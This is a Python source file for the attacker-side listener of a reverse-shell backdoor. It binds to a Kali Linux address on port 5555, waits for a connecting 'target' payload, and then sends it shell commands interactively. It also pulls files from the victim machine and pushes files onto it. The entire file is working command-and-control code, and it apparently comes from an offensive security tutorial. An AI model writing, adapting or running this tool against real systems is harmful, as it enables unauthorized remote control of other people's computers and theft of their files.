import socket
import json
import os
import platform

#takes data we are going to send
def reliable_send(data):
    jsondata=json.dumps(data) #store actual command
    target.send(jsondata.encode()) #send encoded data to target.


def reliable_recv():
    data= ''
    while True:
        try:
            #get 1024 bites from  and add it to the previous received data
            data = data + target.recv(1024).decode().rstrip() #decode data and restrip it from additional chars
            return json.loads(data)
        except ValueError:
	        continue


def upload_file(file_name):
    f=open(file_name,"rb")
    target.send(f.read())
    pass


#while we download the file, our target uploads the file.
def download_file(file_name):
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()


def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command=='quit':
            break
        elif command[:3]=="cd ":
            pass
        elif command=="clear":
            if platform.system()=="Linux":
                os.system("clear")
            else:
                os.system("cls")#windows
        elif command[:len("download ")]=="download ":
            download_file(command[len("download "):])
            pass
        elif command[:len("upload ")]=="upload ":
            upload_file(command[len("upload "):])
            pass
        else:
            result = reliable_recv()
            print(result + "\n")
        pass
    pass

#first establish a connection between Payload and Server.
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(("192.168.0.208",5555)) # Kali linux IP adress

print("[+] Listening for Connection")

sock.listen(5)# we listen to up to 5 different connections

target, ip = sock.accept()

print("[+] Target Connected from: ",str(ip))

target_communication()
